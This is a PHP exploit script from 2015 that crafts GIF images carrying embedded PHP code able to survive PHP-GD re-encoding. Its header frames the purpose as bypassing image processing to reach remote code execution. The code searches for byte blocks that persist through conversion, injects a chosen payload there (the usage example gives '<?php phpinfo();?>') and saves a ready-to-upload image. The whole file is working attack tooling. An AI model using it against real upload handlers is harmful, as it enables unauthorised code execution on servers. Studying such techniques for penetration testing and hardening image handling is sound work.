<?php
/**
 * Author: rickchen.vip(at)gmail.com
 * Date: 2015-04-05
 * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE
 * Reference: http://www.secgeek.net/bookfresh-vulnerability/
 * Usage: php codeinj.php demo.gif "<?php phpinfo();?>"
 */


function gd_process($src_img, $dst_img) {
    try {
        # you can redefine the GD process
        $im = imagecreatefromgif($src_img);
        imagegif($im, $dst_img);
    } catch (Exception $e) {
        printf("%s\n", $e->getMessage());
        return false;
    }

    return true;
}


function find_similar_block($src_img, $dst_img, $block_len, $slow=false) {
    $src_data = fread(fopen($src_img, "rb"), filesize($src_img));
    $dst_data = fread(fopen($dst_img, "rb"), filesize($dst_img));
    $src_index = 0;
    $pre_match_array = array();

    while ($src_index < (strlen($src_data) - $block_len)) {
        $find_data = substr($src_data, $src_index, $block_len);

        $dst_index = 0;
        $found = false;
        while ($dst_index < (strlen($dst_data) - $block_len)) {
            $temp_data = substr($dst_data, $dst_index, $block_len);
            if (0 === strcmp($find_data, $temp_data)) {
                $match = array(
                    "src_offset" => $src_index,
                    "dst_offset" => $dst_index
                );
                $pre_match_array[] = $match;
                $found = true;

                /*
                printf("Similar block found> src_offset: %d\n", $src_index);
                printf("                     dst_offset: %d\n", $dst_index);
                printf("                   similar_data: %s\n", str2hex($temp_data));
                printf("                 similar_length: %s\n\n", strlen($temp_data));
                */
            }
            if ($found && $slow == false)
                $dst_index += $block_len;
            else
                $dst_index++;
        }

        if ($found && $slow == false)
            $src_index += $block_len;
        else
            $src_index++;
    }

    return $pre_match_array;
}


function inject_code_to_src_img($src_img, $pre_match_array, $injection_code) {
    $src_data = fread(fopen($src_img, "rb"), filesize($src_img));
    $inj_len = strlen($injection_code);

    $find_n = 0;
    foreach ($pre_match_array as $similar_block) {
        #printf("Trying inject code to source image with offset: %d, length: %d\n", $similar_block["src_offset"], $inj_len);
        $mod_src_data = substr($src_data, 0, $similar_block["src_offset"]).$injection_code.substr($src_data, $similar_block["src_offset"] + $inj_len);
        $temp_img = sys_get_temp_dir()."/".$src_img.".mod";
        $temp_cvt_img = $temp_img.".gd";
        fwrite(fopen($temp_img, "wb"), $mod_src_data);

        if (!gd_process($temp_img, $temp_cvt_img)) {
            #printf("PHP-GD process() the image modified error, offset: %d\n", $similar_block["src_offset"]);
            #printf("                                           length: %d\n\n", $inj_len);
            continue;
        } else {
            if (check_code($temp_cvt_img, $injection_code)) {
                $fuck_img = "gd_".$src_img;
                fwrite(fopen($fuck_img, "wb"), $mod_src_data);
                printf("Inject code to source image successful with offset: %d\n", $similar_block["src_offset"]);
                printf("Saving result \"%s\", have fun! :)\n", $fuck_img);
                exit;
            } else {
                continue;
                #printf("Modified image doesn't work well, offset: %d, retry...\n", $similar_block["src_offset"]);
            }
        }
    }
}


function check_code($src_img, $injection_code) {
    $data = fread(fopen($src_img, "rb"), filesize($src_img));

    return strpos($data, $injection_code);
}


function str2hex($str){
    $hex = "";
    for ($i = 0; $i < strlen($str); $i++){
        $hex .= sprintf("%02x", (ord($str[$i])));;
    }

    return $hex;
}


function hex2str($hex){
    $str = "";
    for ($i = 0; $i < strlen($hex)-1; $i+=2){
        $str .= chr(hexdec($hex[$i].$hex[$i+1]));
    }

    return $str;
}


/* main */
if ($argc < 3) {
    printf("Usage: php %s <src_img> <inj_code>\n", $argv[0]);
    exit;
}

$slow = false;
$src_img = $argv[1];
$injection_code = $argv[2];

$img_info = getimagesize($src_img);

/* GIF image type value "1" */
if ($img_info[2] == '1') {
    $cvt_img = sys_get_temp_dir()."/".basename($src_img);
    if (!gd_process($src_img, $cvt_img)) {
        printf("PHP-GD process() function error, please check out.\n");
        exit;
    }
} else {
    printf("This script only support GIF image.\n");
    exit;
}

$block_len = strlen($injection_code);
$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);

if (sizeof($pre_match_array)) {
    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);
} else {
    printf("Not found any similar %d bytes block.\n", strlen($injection_code));
}

printf("Cant find any useful similar block to inject code, but take it easy. :(\n");
